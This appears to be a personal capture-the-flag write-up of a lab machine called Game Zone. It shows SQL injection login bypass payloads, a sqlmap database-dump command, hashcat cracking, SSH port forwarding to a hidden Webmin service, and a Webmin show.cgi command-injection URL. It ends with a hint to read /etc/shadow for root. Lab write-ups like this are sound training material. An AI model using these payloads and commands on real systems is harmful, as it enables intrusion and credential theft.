# what I learned
- sqlmap
- checking opent socket connection `ss -tulpn`
- Reverse SSH port forwarding
- read more about exploit, msfconsole is not only one solution. you can try something else too.


# enumerate
- 22/tcp open  ssh
- 80/tcp open  http
  - Apache/2.4.18 (Ubuntu)
  - **gobuster**
    - /images (Status: 301)
    - /index.php (Status: 200)
    - /portal.php (Status: 302)

# foothold
the log in form is vulnerable to SQLi. I try username `admin`, pass `' or 1=1 -- -` but it didnt works. I then try to insert `' or 1=1 -- -` as username instead.

Vola, it redirected me to */portal.php*. there is a search form that can be use to searching for a game review. is it also vulnerable to SQLi?. let insert `' or 1=1 -- -` in the search form. 

![sqli](pic/Screenshot%202020-07-27%20at%2012.32.50.png)

yep we got all the reviewed game. which mean it is vulnerable to SQLi.

now we gonna use SQLmap which is a automatic SQL injection and database takeover tool. the plan is use it to dump the whole database. let start with open *burpsuite* and intercept the get request when we using search bar.

copy all reqest header and save it in a .txt file. we will use it in SQLmap.

```console
kali@kali:~/THM/game$ ls
req.txt
kali@kali:~/THM/game$ head req.txt 
POST /portal.php HTTP/1.1
Host: 10.10.102.254
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.102.254/portal.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close
kali@kali:~/THM/game$ sqlmap -r req.txt --dbms=mysql --dump
```
you will get 2 table.
1. post: contains all game review
2. user: user:password

now let crack the password using *hashcat*
```console
$ hashcat -m 1400 -a 0 -o crack.txt 'hash' /usr/share/wordlists/rockyou.txt --force
```
now ssh to the server and get user flag
```console
agent47@gamezone:~$ sudo -l
[sudo] password for agent47: 
Sorry, user agent47 may not run sudo on gamezone.
```
# root
check socket connections:
```console
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q  Local Address:Port                 Peer Address:Port              
udp   UNCONN     0      0                   *:10000                           *:*                  
udp   UNCONN     0      0                   *:68                              *:*                  
tcp   LISTEN     0      80          127.0.0.1:3306                            *:*                  
tcp   LISTEN     0      128                 *:10000                           *:*                  
tcp   LISTEN     0      128                 *:22                              *:*                  
tcp   LISTEN     0      128                :::80                             :::*                  
tcp   LISTEN     0      128                :::22                             :::* 
```
use `curl` to flind more about web socket port 10000. seem like it run `Webmin`. now let check `ps aux` and find out if webmin is run by root. if so we migh can use it to escalate and gain root priv.

```console
agent47@gamezone:~$ ps aux | grep webmin
root      1235  0.0  1.2  75020 25928 ?        Ss   05:11   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```
Bingo ! webmin is running by root


We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the `IPtable` list). However, Using an SSH Tunnel we can expose the port to us (locally)!


If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do `ssh -L 9000:imgur.com:80 user@example.com.` Going to `localhost:9000` on your machine, will load imgur traffic using your other server.

on kali
```console
kali@kali:~/THM/game$ ssh -L 9999:localhost:10000 agent47@$IP
```
now visite localhost:9999. I tried to loging with defualt credential but it didnt works. I then try using agent47 credential. Bingo !

after I got ther webmin version and research about exploit. I found [this](https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_show_cgi_exec) so let use `msfconsole` then


Damn it! it didnt works for me. then I found [this](https://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf) in References of the msf modules link (previous link)


read page 2 under *3  Technical Explanation* you will find some juciy infomation.
`“https://webminserver.dom.com/file/show.cgi/bin/echo|ls%20–la|”`
you can manipulate this the last part of url (after `/file/show.cgi/bin/`) and make it return the file you want.



**hint**: `/file/show.cgi/bin/echo|cat%20 something`
you want to get root access? use the same method but cat /etc/shadow instead then crack root's password.

GLHF
